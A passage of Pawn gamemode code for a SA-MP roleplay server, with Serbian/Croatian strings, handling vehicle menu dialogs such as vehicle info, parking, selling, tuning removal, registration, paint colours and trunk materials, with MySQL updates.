																										  {4282C0}(11). {FFFFFF}Uzmi Tablice\n\
																										  {4282C0}(12). {FFFFFF}Postavi tablice", "Odaberi", "Nazad" );
	           	}
	       		else
		   		{
					SendClientMessage( playerid, ANTICHEAT, "(ANTICHEAT): Ovo vozilo nije u vasem vlasnistvu, obratite se na forumu ako mislite je greska." );
				}
			}
			else
			{
				SendClientMessage( playerid, ANTICHEAT, "(ANTICHEAT): Vase vozilo ne postoji u bazi podataka, obratite se na forumu ako mislite je greska." );
			}
		}
	}
	else if(dialogid == dialog_VEHCHOSEN )
	{
	    if( !response ) return 1;
		if( response )
		{
			switch( listitem )
			{
			    case 0:
				{
			        new izbor = ChosenVehicle[ playerid ];

                    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
					format( globalstring, sizeof( globalstring ), "{4282C0}- Vozilo: {FFFFFF}%s {4282C0}| Model ID: {FFFFFF}(%d)\n\n", ImeVozila[ VehicleInfo[ izbor ][ vModel ]-400 ],  VehicleInfo[ izbor ][ vModel ] );
					strcat( DialogStrgEx, globalstring);

					format( globalstring, sizeof( globalstring ), "{4282C0}- InGame ID: {FFFFFF}(%d) {CCCCCC}[PROMENLJIVI]\n", izbor );
					strcat( DialogStrgEx, globalstring);

					format( globalstring, sizeof( globalstring ), "{4282C0}- SQL ID: {FFFFFF}(%d) {CCCCCC}[STALNI]\n", VehicleInfo[ izbor ][ vSqlID ] );
					strcat( DialogStrgEx, globalstring);

					if( VehicleInfo[ izbor ][ vReg ] == 1 )
					{
					    new tablice[ 10 ];
						format( tablice, sizeof( tablice ), "LS-%04d", izbor );

					    format( globalstring, sizeof( globalstring ), "{4282C0}- Registracija: {FFFFFF}%s\n",  tablice );
						strcat( DialogStrgEx, globalstring);
						if(VehicleInfo[izbor][vRegVreme] > 0) format( globalstring, sizeof( globalstring ), "{4282C0}- Registrovan jos: {FFFFFF}(%dh)\n",  VehicleInfo[ izbor ][ vRegVreme ] );
						else format( globalstring, sizeof( globalstring ), "{4282C0}- Ostalo do brisanja vozila: {FFFFFF}(%dh) {FF0000}[REGISTRUJTE VOZILO!]\n", VehicleInfo[ izbor ][ vRegVreme ]+100 );
						strcat( DialogStrgEx, globalstring);
					}
					else if( VehicleInfo[ izbor ][ vReg ] == 2 )
					{
					    format( globalstring, sizeof( globalstring ), "{4282C0}- Registracija: {FFFFFF}%s\n",  VehicleInfo[ izbor ][ vTablice ] );
						strcat( DialogStrgEx, globalstring);
						if(VehicleInfo[izbor][vRegVreme] > 0) format( globalstring, sizeof( globalstring ), "{4282C0}- Registrovan jos: {FFFFFF}(%dh)\n",  VehicleInfo[ izbor ][ vRegVreme ] );
						else format( globalstring, sizeof( globalstring ), "{4282C0}- Ostalo do brisanja vozila: {FFFFFF}(%dh) {FF0000}[REGISTRUJTE VOZILO!]\n", VehicleInfo[ izbor ][ vRegVreme ]+100 );
						strcat( DialogStrgEx, globalstring);
					}
					else
					{
					    format( globalstring, sizeof( globalstring ), "{4282C0}- Ostalo do brisanja vozila: {FFFFFF}(%dh) {FF0000}[REGISTRUJTE VOZILO!]\n", VehicleInfo[ izbor ][ vRegVreme ]+100 );
						strcat( DialogStrgEx, globalstring);
					}

					if( VehicleInfo[ izbor ][ vLocked ] == 1) strcat( DialogStrgEx, "{4282C0}- Status brave: {FFFFFF}'Zakljucano'\n");
					else strcat( DialogStrgEx, "{4282C0}- Status brave: {FFFFFF}'Otkljucano'\n");
                    format( globalstring, sizeof( globalstring ), "{4282C0}- Predjena kilometraza: {FFFFFF}(%d)\n", VehicleInfo[ izbor ][ vKilometri ] );
					strcat( DialogStrgEx, globalstring);

					if( VehicleInfo[ izbor ][ vLock ] == 0) strcat( DialogStrgEx, "{4282C0}- Kvaliteta brave: {FFFFFF}'Nekvalitetna'\n");
					else
					{
						format( globalstring, sizeof( globalstring ), "{4282C0}- Kvaliteta brave: {FFFFFF}(%d)\n",  VehicleInfo[ izbor ][ vLock ] );
						strcat( DialogStrgEx, globalstring);
					}
			        if( VehicleInfo[ izbor ][ vImobilizator ] == 0) strcat( DialogStrgEx, "{4282C0}- Imobilizator: {FFFFFF}'Nekvalitetan'\n");
					else
					{
					    format( globalstring, sizeof( globalstring ), "{4282C0}- Imobilizator level: {FFFFFF}'%d'\n",  VehicleInfo[ izbor ][ vImobilizator ] );
						strcat( DialogStrgEx, globalstring);
					}

					if( VehicleInfo[ izbor ][ vAlarm ] > 0)
					{
						format( globalstring, sizeof( globalstring ), "{4282C0}- Alarm level: {FFFFFF}(%d)\n",  VehicleInfo[ izbor ][ vAlarm] );
						strcat( DialogStrgEx, globalstring);
					}
					else strcat( DialogStrgEx, "{4282C0}- Alarm: {FFFFFF}'Nema'\n");

					ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogStrgEx, "OK", "" );
	    			strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
				}
			    case 1:
				{
			        new izbor = ChosenVehicle[ playerid ],
						Float:HP,
						Float:Pos[ 4 ];

                    if( carspawntimer == 1 )
					{
						SCMF( playerid, ANTICHEAT, "(ANTICHEAT): Neko je kupio/parkirao vozilo pre vas. Pokusajte za 3 sekunde. (Anticrash)");
						return 1;
				    }

					if( !IsPlayerInVehicle( playerid, izbor ) ) return SendErrorMessage( playerid, "Morate biti u svom vozilu.");
                    if( GetPlayerVehicleSeat( playerid ) != 0) return SendErrorMessage( playerid, "Morate biti u svom vozilu na vozackom mjestu.");
                    if( IsPlayerInArea( playerid, 1486.062, -1776.608, 1653.387, -1567.377 ) ) return SendErrorMessage( playerid, "Ne mozete parkirati auto u blizini policije.");
					if( IsPlayerInArea( playerid, 1136.201, -1014.694, 1311.132, -856.7839 ) ) return SendErrorMessage( playerid, "Ne mozete parkirati auto u blizini burga.");
					if( IsPlayerInArea( playerid, 1383.386, -1077.857, 1554.513, -947.582 ) ) return SendErrorMessage( playerid, "Ne mozete parkirati auto u blizini banke.");

                    GetVehicleHealth( GetPlayerVehicleID( playerid ), HP );
					if( HP < 800.0 ) return SendErrorMessage( playerid, "Motor vam je previse ostecen, ne mozete ga parkirati.");

                    GetVehiclePos( izbor, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
					GetVehicleZAngle( izbor, Pos[ 3 ] );

                    VehicleInfo[ izbor ][ vVirtualWorld ] = GetPlayerVirtualWorld( playerid );
					VehicleInfo[ izbor ][ vInterior ] = GetPlayerInterior( playerid );

					VehicleInfo[ izbor ][ vLokacijaX ] = Pos[ 0 ];
					VehicleInfo[ izbor ][ vLokacijaY ] = Pos[ 1 ];
					VehicleInfo[ izbor ][ vLokacijaZ ] = Pos[ 2 ];
					VehicleInfo[ izbor ][ vLokacijaA ] = Pos[ 3 ];

					new q[ 256 ];
					mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `v_pos_x` = '%f', `v_pos_y` = '%f', `v_pos_z` = '%f', `v_pos_a` = '%f', `v_virtualw` = '%d', `v_interior` = '%d' WHERE `veh_id` = '%d' LIMIT 1",
						VehicleInfo[ izbor ][ vLokacijaX ],
						VehicleInfo[ izbor ][ vLokacijaY ],
						VehicleInfo[ izbor ][ vLokacijaZ ],
						VehicleInfo[ izbor ][ vLokacijaA ],
						VehicleInfo[ izbor ][ vVirtualWorld ],
						VehicleInfo[ izbor ][ vInterior ],
						VehicleInfo[ izbor ][ vSqlID ] );

			   		mysql_tquery( mSQL, q, "park_vehicleCheckID", "ii", playerid, izbor );

					SCMF( playerid, 0xFFFF00FF, "(VOZILO): Uspesno ste parkirali vozilo.");
			    }
			    case 2:
				{
			        new vehicleid = ChosenVehicle[ playerid ];
					if( !LocatingCar[playerid] )
					{
			  			GameTextForPlayer( playerid, "~y~spajanje na satelit...", 6000, 1);
				        SetPlayerTimerEx(playerid, "GPSConnect", 5000, false, "iii", playerid, 1, vehicleid);
				        GPSTimerCalled[playerid] = true;
				    }
					else
					{
				 		LocatingCar[playerid] = false;
						GameTextForPlayer( playerid, "~r~gps ugasen", 4500, 1);
						CheckpointStatus[ playerid ] = 0;
						PlayerPlaySound( playerid, 1145, 0.0, 0.0, 0.0);
						SMG_DisablePlayerCheckpoint( playerid );
					}
			    }
			    case 3:
				{
			        new vehicleid = ChosenVehicle[ playerid ];
			        if( !IsPlayerInVehicle( playerid, vehicleid ) ) return SendErrorMessage( playerid, "Morate biti u svom vozilu.");
                    ShowPlayerDialog( playerid, dialog_VEHSELLTP, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite ID igraca kome zelite da prodate vozilo i cenu.\nPrimer: 145 425003", "Potvrdi", "Odustani" );
			    }
			    case 4:
				{
			        new vehicleid = ChosenVehicle[ playerid ];
			        if( !IsPlayerInVehicle( playerid, vehicleid ) ) return SendErrorMessage( playerid, "Morate biti u svom vozilu!");
			        if(GlobalImovinaIgracu[playerid] != false) return SendErrorMessage(playerid, "Ne mozes prodati vozilo dok je u procesu prodaja igracu!");

					new str[ 128 ];
					format( str, sizeof( str ), "{FFFFFF}* Da li ste sigurni da zelite da prodate %s za %d?", GetVehicleNameEx( VehicleInfo[ vehicleid ][ vModel ] ), VehicleInfo[ vehicleid ][ vPrice ]/2 );
                    ShowPlayerDialog( playerid, dialog_VEHSELLDRZAVI, DIALOG_STYLE_MSGBOX, D_NASLOV, str, "Da", "Ne" );
			    }
			    case 5:
				{
			        new izbor = ChosenVehicle[ playerid ];
					if( !IsPlayerInVehicle( playerid, izbor ) ) return SendErrorMessage( playerid, "Morate biti u svom vozilu.");

					if( Neon[ izbor ] == 1)
					{
				 		Neon[ izbor ] = 0;
					    DestroyDynamicObject( NeonObject1[ izbor ] );
				     	DestroyDynamicObject( NeonObject2[ izbor ] );
					}

					VehicleInfo[ izbor ][ vNeon ] = 0;
				    VehicleInfo[ izbor ][ vTuned ] = 0;
				    VehicleInfo[ izbor ][ vSpoiler ] = 0;
				    VehicleInfo[ izbor ][ vHood ] = 0;
				    VehicleInfo[ izbor ][ vRoof ] = 0;
				    VehicleInfo[ izbor ][ vSkirt ] = 0;
				    VehicleInfo[ izbor ][ vLamps ] = 0;
				    VehicleInfo[ izbor ][ vNitro ] = 0;
				    VehicleInfo[ izbor ][ vExhaust ] = 0;
				    VehicleInfo[ izbor ][ vWheels ] = 0;
				    VehicleInfo[ izbor ][ vStereo ] = 0;
				    VehicleInfo[ izbor ][ vHydraulics ] = 0;
				    VehicleInfo[ izbor ][ vFrontBumper ] = 0;
				    VehicleInfo[ izbor ][ vRearBumper ] = 0;
				    VehicleInfo[ izbor ][ vVents ] = 0;
				    VehicleInfo[ izbor ][ vPaintJob ] = 255;
				    ChangeVehiclePaintjob( izbor, 3 );

					new componentid;
					for( new i; i < 14; i++ )
					{
					    componentid = GetVehicleComponentInSlot( izbor, i );
					    if( componentid != 0 ) RemoveVehicleComponent( izbor, componentid );
					}

					SendClientMessage( playerid, 0xFFFF00FF, "(VOZILO): Skinuli ste tuning sa vozila." );
					sql_vehicles_update_tuning( izbor );
			    }
			    case 6:
				{
			        new izbor = ChosenVehicle[ playerid ];
					if( !IsPlayerInVehicle( playerid, izbor ) ) return SendErrorMessage( playerid, "Morate biti u svom vozilu!");
				    if( GetPlayerVehicleSeat( playerid ) != 0) return SendErrorMessage( playerid, "Morate biti u svom vozilu na vozackom mjestu!");
				    if( VehicleInfo[ izbor ][ vNeon ] == 0 ) return SendErrorMessage( playerid, "Na ovom vozilu nije ugradjena neonka!");
					if( Neon[ izbor ] == 0 )
					{
						Neon[ izbor ] = 1;
			          	NeonObject1[ izbor ] = CreateDynamicObject( VehicleInfo[ izbor ][ vNeon ], 0, 0, 1500, 0, 0, 0 );
			            NeonObject2[ izbor ] = CreateDynamicObject( VehicleInfo[ izbor ][ vNeon ], 0, 0, 1500, 0, 0, 0 );
			          	AttachDynamicObjectToVehicle( NeonObject1[ izbor ],  izbor , -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
			          	AttachDynamicObjectToVehicle( NeonObject2[ izbor ],  izbor , 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);

						SendNearbyMessage(playerid, 30.0, 0xC2A2DAFF, "* %s pritisce dugme na komodi i postavlja neonke.", ImeIgraca( playerid ) );
					}
			        else if( Neon[ izbor ] == 1 )
					{
			            Neon[ izbor ] = 0;
			            DestroyDynamicObject( NeonObject1[ izbor ] );
			            DestroyDynamicObject( NeonObject2[ izbor ] );

			            SendNearbyMessage(playerid, 30.0, 0xC2A2DAFF, "* %s pritisce gumb na komodi i uvlaci neonke.", ImeIgraca( playerid ) );
			        }
			    }
			    case 7: SendClientMessage( playerid, 0xFFFF00FF, "(VOZILO): Za upravljanje gepekom kucajte {FFFFFF}[ /gepek ]." );
			    case 8: ShowPlayerDialog( playerid, dialog_VEHCOLOR, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesi ID boje 1 i ID boje 2 vozila.\nPrimer: 1 2", "Potvrdi", "Odustani" );
			    case 9:
				{
                    new vehicleid = ChosenVehicle[ playerid ];

					if( !IsPlayerInRangeOfPoint( playerid, 2.0, -1873.1699, 2675.4045, 3.5904)) return SendErrorMessage( playerid, "Da biste koristili ovu komandu morati biti u opstini." );
			        if( VehicleInfo[ vehicleid ][ vTeh ] != 1 ) return SendErrorMessage( playerid, "Vozilo nije proslo tehnicki pregled(kod mehanicara)!");
					if( PlayerInfo[ playerid ][ xNovac ] < 1000 ) return SendErrorMessage( playerid, "Nemas dovoljno novca(1000$)." );
					DajIgracuNovac( playerid, -1000 );
					VehicleInfo[ vehicleid ][ vTeh ] = 2;

					new q[ 128 ];
					mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `v_teh` = '%d' WHERE `veh_id` = '%d' LIMIT 1",
														VehicleInfo[ vehicleid ][ vTeh ],
														VehicleInfo[ vehicleid ][ vSqlID ] );

					mysql_tquery( mSQL, q );

					SendClientMessage( playerid, 0xFFFF00FF, "(VOZILO): Overio si papire vozila, idi u policijsku stanicu da uzmes tablice." );
				}
				case 10:
				{
			        new izbor = ChosenVehicle[ playerid ];

					if( !IsPlayerInRangeOfPoint(playerid, 2.0, 1359.1913,1067.7510,1626.4896) && !IsPlayerInRangeOfPoint(playerid, 2.0, -8.1004,10.1807,2005.4124)) return SendErrorMessage( playerid, "Morate biti u policijskoj stanici." );
			        if( VehicleInfo[ izbor ][ vTeh ] != 2 ) return SendErrorMessage( playerid, "Nisi overio papire u opstini!");
					if( PlayerInfo[ playerid ][ xNovac ] < 100 ) return SendErrorMessage( playerid, "Nemas dovoljno novca(100$)." );
			        DajIgracuNovac( playerid, -100 );

			        ShowPlayerDialog( playerid, dialog_IZABERITABLICE, DIALOG_STYLE_LIST, D_NASLOV,
						"{4282C0}(1). {FFFFFF}Brojevne tablice\n\
						{4282C0}(2). {FFFFFF}Tablice po zelji", "Izaberi", "Odustani" );
				}
				case 11:
				{
			        new izbor = ChosenVehicle[ playerid ];

					new Float:x, Float:y, Float:z;
					GetVehiclePos( izbor, x, y, z );
					if( !IsPlayerInRangeOfPoint( playerid, 7.0, x, y, z ) )
					{
						SendErrorMessage( playerid, "Nisi u blizini auta.");
						return 1;
					}
					if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Moras biti van auta!" );
			        if( VehicleInfo[ izbor ][ vTeh ] < 3 ) return SendErrorMessage( playerid, "Nisi uzeo tablice iz policijske stanice!");

					if( VehicleInfo[ izbor ][ vTeh ] == 3 ) VehicleInfo[ izbor ][ vReg ] = 1;
					else if( VehicleInfo[ izbor ][ vTeh ] == 4 ) VehicleInfo[ izbor ][ vReg ] = 2;

					VehicleInfo[ izbor ][ vTeh ] = 0;
					VehicleInfo[ izbor ][ vRegVreme ] = 500;

					new q[ 256 ];
					mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `v_teh` = '%d', `v_reg` = '%d', `v_reg_vreme` = '%d' WHERE `veh_id` = '%d' LIMIT 1",
														VehicleInfo[ izbor ][ vTeh ],
														VehicleInfo[ izbor ][ vReg ],
														VehicleInfo[ izbor ][ vRegVreme ],
														VehicleInfo[ izbor ][ vSqlID ] );

					mysql_tquery( mSQL, q );

					SetPlayerTimerEx(playerid, "Postaviotable", 5000, false, "ii", playerid, izbor);
					SMG_TogglePlayerControllable(playerid, false);
					ApplyAnimation( playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 5000, 0);
					ApplyAnimation( playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 5000, 0);

					SendClientMessage( playerid, 0xFFFF00FF, "(VOZILO): Vase vozilo je registrovano 20 dana(500 sati)." );
				}
			}
		}
	}
	else if(dialogid == dialog_ACCEPTVEH )
	{
	    if( response )
		{
            new seller = GlobalProdaja[ playerid ],
				autoid = GlobalID[ playerid ];

	 		if( seller == IPI  ) return SendErrorMessage( playerid, "Taj igrac je offline.");
	 		if( carspawntimer == 1 ) return SCMF( playerid, ANTICHEAT, "(ANTICHEAT): Neko je spawnao/parkirao vozilo pre vas. Pokusajte za 3 sekunde. (Anticrash)");

            new slot = -1;
			for( new j = 0; j < MAX_VEH_SLOT; j ++ )
			{
				if( player_veh[ seller ][ vehicle_id ][ j ] != -1 && player_veh[ seller ][ vehicle_id ][ j ] == autoid  )
				{
			  		slot = j;
					break;
				}
			}
			if( slot == -1 ) return SendErrorMessage( playerid, "To vozilo nije u vlasnistvu igraca koji vam ga je ponudio!");

			if( !IsPlayerNearPlayer( 5.0, playerid, seller ) ) return SendErrorMessage( playerid, "Niste blizu igraca koji vam zeli prodati vozilo.");
			if( PlayerInfo[ playerid ][ xNovac ] < GlobalCena[ playerid ] ) return SendErrorMessage( playerid, "Nemate dovoljno novca za kupiti vozilo.");
			if( !IsPlayerConnected( seller ) )
			{
				SendErrorMessage( playerid, "Taj igrac je offline.");
				GlobalProdaja[ playerid ] = -1;
				GlobalCena[ playerid ] = -1;
				GlobalID[ playerid ] = -1;
				return 1;
			}

            slot = -1;
		    for( new j = 0; j < MAX_VEH_SLOT; j ++ )
			{
				if( (j+1) <= PlayerInfo[ playerid ][ xSlotoviVozila ] && player_veh[ playerid ][ vehicle_id ][ j ] == -1 )
				{
			  		slot = j;
					break;
				}
			}
			if( slot == -1 ) return SendErrorMessage( playerid, "Svi slotovi vozila su vam zauzeti." );

			strmid( VehicleInfo[ autoid ][ vOwner ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 24);
			VehicleInfo[ autoid ][ vOwner_sqlID  ] = PlayerInfo[ playerid ][ xID ];
			VehicleInfo[ autoid ][ v_owner_id ] = playerid;

			new q[ 128 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `owner_sqlID` = '%d' WHERE `veh_id` = '%d' LIMIT 1",
									VehicleInfo[ autoid ][ vOwner_sqlID ],
									VehicleInfo[ autoid ][ vSqlID ] );

			mysql_tquery( mSQL, q );

            for( new j = 0; j < MAX_VEH_SLOT; j ++ )
			{
                if( player_veh[ seller ][ vehicle_id ][ j ] == autoid )
				{
					player_veh[ seller ][ vehicle_id ][ j ] = -1;
					break;
				}
            }

            for( new j = 0; j < MAX_VEH_SLOT; j ++ )
			{
                if( (j+1) <= PlayerInfo[ playerid ][ xSlotoviVozila ] && player_veh[ playerid ][ vehicle_id ][ j ] == -1 )
				{
					player_veh[ playerid ][ vehicle_id ][ j ] = autoid;
					break;
				}
            }

			WriteLog("log-sell", "Igrac %s je prodao vozilo %s igracu %s za %d", ImeIgraca( seller ), GetVehicleNameEx( VehicleInfo[ autoid ][ vModel ] ), ImeIgraca( playerid ), GlobalCena[ playerid ]);

			DajIgracuNovac( seller, GlobalCena[ playerid ] );
			RemovePlayerFromVehicle( seller );

			DajIgracuNovac( playerid, -GlobalCena[ playerid ] );
			SendClientMessage( playerid, 0xFFFF00FF, "(VOZILO): Uspesno ste kupili vozilo." );
			SendClientMessage( seller, 0xFFFF00FF, "(VOZILO): Uspesno ste prodali vozilo." );

	        carspawntimer = 1;
			SetTimer_("AntiSpawnCrash", 3000, 3000, 1);

			GlobalProdaja[ playerid ] = -1;
			GlobalCena[ playerid ] = -1;
			GlobalID[ playerid ] = -1;
			GlobalImovinaIgracu[GlobalProdaja[playerid]] = false;
			GlobalImovinaIgracu[GlobalProdaja[seller]] = false;
	    }
	    else if( !response )
		{
			SCMF( GlobalProdaja[ playerid ], 0xFFFF00FF, "(VOZILO): Igrac {FFFFFF}%s {FFFF00}je odbio vasu ponudu za kupovinu vozla.", ImeIgraca( playerid ) );
			SendClientMessage( playerid, 0xFFFF00FF, "(VOZILO): Odbili ste ponudu.");
			GlobalProdaja[ playerid ] = -1;
			GlobalCena[ playerid ] = -1;
			GlobalID[ playerid ] = -1;
	    }
	}
	else if(dialogid == dialog_VEHSELLDRZAVI )
	{
	    if( !response ) return 1;
		if( response )
		{
 			new vehicleid = ChosenVehicle[ playerid ];
     		if( !IsPlayerInVehicle( playerid, vehicleid ) ) return SendErrorMessage( playerid, "Morate biti u svom vozilu!");

			WriteLog("log-sell", "Igrac %s je prodao vozilo %s na aukciju", ImeIgraca( playerid ), GetVehicleNameEx( VehicleInfo[ vehicleid ][ vModel ] ));

			DajIgracuNovac( playerid, VehicleInfo[ vehicleid ][ vPrice ]/2 );
			SCMF( playerid, ZUTA, "(VOZILO): Dobili ste {FFFFFF}($%d) {FFFF00}za ovo vozilo.", VehicleInfo[ vehicleid ][ vPrice ]/2 );

			for( new j = 0; j < MAX_VEH_SLOT; j ++ )
			{
				if( player_veh[ playerid ][ vehicle_id ][ j ] == vehicleid )
				{
  					player_veh[ playerid ][ vehicle_id ][ j ] = -1;
					break;
				}
			}

			sql_vehicles_delete( vehicleid );
			ResetVehicle( vehicleid );
			SMG_DestroyVehicle( vehicleid );
			SendClientMessage( playerid, ZUTA, "(VOZILO): Vase vozilo je uspesno prodano otpadu.");
		}
	}
	else if(dialogid == dialog_VEHSELLTP )
	{
	    if( !response ) return 1;
		if( response )
		{
	        new idigraca, string[ 128 ],
				cena,
				autoid = ChosenVehicle[ playerid ];

			if( sscanf( inputtext, "ui", idigraca, cena ) ) return ShowPlayerDialog( playerid, dialog_VEHSELLTP, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id igraca kome zelite da prodate vozilo i cenu.\nPrimer: 145 12003", "Potvrdi", "Odustani" );
			if( !IsPlayerConnected( idigraca ) || idigraca == IPI ) return SendErrorMessage( playerid, "Nevaljan ID igraca.");
			if( !IsPlayerNearPlayer( 5.0, playerid, idigraca ) ) return SendErrorMessage( playerid, "Taj igrac nije blizu vas !");
            if( idigraca == playerid ) return SendErrorMessage( playerid, "Ne mozes sam sebi prodati vozilo!");

            new slot = -1;
			for( new j = 0; j < MAX_VEH_SLOT; j ++ )
			{
				if( (j+1) <= PlayerInfo[ playerid ][ xSlotoviVozila ] && player_veh[ playerid ][ vehicle_id ][ j ] != -1 && player_veh[ playerid ][ vehicle_id ][ j ] == autoid )
				{
			  		slot = j;
					break;
				}
			}
			if( slot == -1 ) return SendErrorMessage( playerid, "Ovo vozilo nije u vasem vlasnistvu." );

            slot = -1;
		    for( new j = 0; j < MAX_VEH_SLOT; j ++ )
			{
				if( (j+1) <= PlayerInfo[ idigraca ][ xSlotoviVozila ] && player_veh[ idigraca ][ vehicle_id ][ j ] == -1 )
				{
			  		slot = j;
					break;
				}
			}
			if( slot == -1 ) return SendErrorMessage( playerid, "Svi slotovi vozila izabranog igraca su zauzeti." );

			if( cena < ( VehicleInfo[ autoid ][ vPrice ]/2 ) ) return SendErrorMessage( playerid, "Cena mora biti veca od polovine kupljene.");

	        if( !IsVehicleBajs( autoid ) ) {
				if( PlayerInfo[ idigraca ][ xLevel ] < 5 ) return SendErrorMessage( playerid, "Igrac mora biti level 5+ da bi ste mu prodali vozilo." );
			}

            SCMF( playerid, 0xFFFF00FF, "(VOZILO): Ponudili ste igracu {FFFFFF}%s {FFFF00}vozilo po ceni od {FFFFFF}(%d).", ImeIgraca( idigraca ), cena );
			GlobalProdaja[ idigraca ] = playerid;
			GlobalCena[ idigraca ] = cena;
			GlobalID[ idigraca ] = autoid;
			GlobalImovinaIgracu[playerid] = true;
			format( string, sizeof( string ), "{FFFFFF}* Igrac %s vam je ponudio da kupite njegovo vozilo marke %s za %d.", ImeIgraca( playerid ), GetVehicleNameEx( VehicleInfo[ autoid ][ vModel ] ), cena );
			ShowPlayerDialog( idigraca, dialog_ACCEPTVEH, DIALOG_STYLE_MSGBOX, D_NASLOV, string, "Prihvati", "Odbij" );
	    }
	}
	else if(dialogid == dialog_VEHCOLOR )
	{
	    if( !response ) return 1;
		if( response )
		{
		    new boja1, boja2, vehicleid = ChosenVehicle[ playerid ];
		    if( sscanf( inputtext, "ii", boja1, boja2 ) ) ShowPlayerDialog( playerid, dialog_VEHCOLOR, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesi id boje 1 i id boje 2 vozila.\nPrimer: 1 2", "Potvrdi", "Odustani" );

	        if( boja1 < 0 || boja1 > 255 ) return SendErrorMessage( playerid, "Prva boja ne moze biti manja od 0 ili veca od 255.");
	    	if( boja2 < 0 || boja2 > 255 ) return SendErrorMessage( playerid, "Druga boja ne moze biti manja od 0 ili veca od 255.");

            if( !IsPlayerInVehicle( playerid, vehicleid ) ) return SendErrorMessage( playerid, "Morate biti u svom vozilu!");

			VehicleInfo[ vehicleid ][ vColor1 ] = boja1;
		    VehicleInfo[ vehicleid ][ vColor2 ] = boja2;

		    new q[ 128 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `v_color_1` = '%d', `v_color_2` = '%d' WHERE `veh_id` = '%d' LIMIT 1",
										VehicleInfo[ vehicleid ][ vColor1 ],
										VehicleInfo[ vehicleid ][ vColor2 ],
										VehicleInfo[ vehicleid ][ vSqlID ] );

			mysql_tquery( mSQL, q );

			SMG_ChangeVehicleColor( vehicleid, boja1, boja2 );
			SCMF( playerid, 0xFFFF00FF, "(VOZILO): Promenili ste boju vozila u {FFFFFF}(%d) - (%d).", boja1, boja2 );
		}
	}
	else if(dialogid == dialog_VEHICLEPUTMATS )
	{
	    if( !response ) return 1;
		if( response )
		{
		    new kolicina,
				vehicleid = ChosenVehicle[ playerid ];

		    if( sscanf( inputtext, "d", kolicina ) ) return ShowPlayerDialog( playerid, dialog_VEHICLEPUTMATS, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite kolicinu materijala za ostavljanje.", "Potvrdi", "Odustani" );

		    if( PlayerInfo[ playerid ][ xMaterijali ] == 0 ) return SendErrorMessage( playerid, "Nemate materijale kod vas!" );
		    if( kolicina < 1 || kolicina > PlayerInfo[ playerid ][ xMaterijali ] ) return SendErrorMessage( playerid, "Nemate toliko materijala kod vas!");

			if( (VehicleInfo[ vehicleid ][ vMaterijali ]+kolicina) > 10000 ) return SendErrorMessage( playerid, "Najvise u gepeku moze stati 10000 materijala." );

            PlayerInfo[ playerid ][ xMaterijali ] -= kolicina;
            sql_user_update_integer( playerid, "materials", PlayerInfo[ playerid ][ xMaterijali ] );

		    SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s stavlja nesto u gepek.", ImeIgraca( playerid ) );
		    SCMF( playerid, 0xFFFF00FF, "(VOZILO): Stavili ste {FFFFFF}(%d) {FFFF00}materijala u gepek.", kolicina );

		    VehicleInfo[ vehicleid ][ vMaterijali ] += kolicina;

			new q[ 128 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `v_mats` = '%d' WHERE `veh_id` = '%d' LIMIT 1",
														VehicleInfo[ vehicleid ][ vMaterijali ],
														VehicleInfo[ vehicleid ][ vSqlID ] );

			mysql_tquery( mSQL, q );
		}
	}
	else if(dialogid == dialog_VEHICLETAKEMATS )
	{
	    if( !response ) return 1;
		if( response )
		{
		    new 
		    	kolicina,
				vehicleid = ChosenVehicle[ playerid ];

		    if( sscanf( inputtext, "i", kolicina ) ) return ShowPlayerDialog( playerid, dialog_VEHICLETAKEMATS, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite kolicinu materijala za uzimanje iz gepeka.", "Potvrdi", "Odustani" );

		    if( VehicleInfo[ vehicleid ][ vMaterijali ] == 0 ) return SendErrorMessage( playerid, "Nema materijala u gepeku!" );
		    if( kolicina < 1 || kolicina > VehicleInfo[ vehicleid ][ vMaterijali ] ) return SendErrorMessage( playerid, "Nemate toliko materijala u gepeku!");

            PlayerInfo[ playerid ][ xMaterijali ] += kolicina;
            sql_user_update_integer( playerid, "materials", PlayerInfo[ playerid ][ xMaterijali ] );

		    SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s uzima nesto iz gepeka.", ImeIgraca( playerid ) );
		    SCMF( playerid, 0xFFFF00FF, "(VOZILO): Uzeli ste {FFFFFF}(%d) {FFFF00}materijala iz gepeka.", kolicina );

		    VehicleInfo[ vehicleid ][ vMaterijali ] -= kolicina;

			new q[ 128 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `v_mats` = '%d' WHERE `veh_id` = '%d' LIMIT 1",
														VehicleInfo[ vehicleid ][ vMaterijali ],
														VehicleInfo[ vehicleid ][ vSqlID ] );

			mysql_tquery( mSQL, q );
		}
	}
	else if(dialogid == dialog_VEHICLEPUTDRUG )
	{
	    if( !response ) return 1;
		if( response )
		{
		    new kolicina,
				izbor = ChosenVehicle[ playerid ];

		    if( sscanf( inputtext, "d", kolicina ) ) return ShowPlayerDialog( playerid, dialog_VEHICLEPUTDRUG, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite kolicinu droge za uzimanje.", "Potvrdi", "Odustani" );

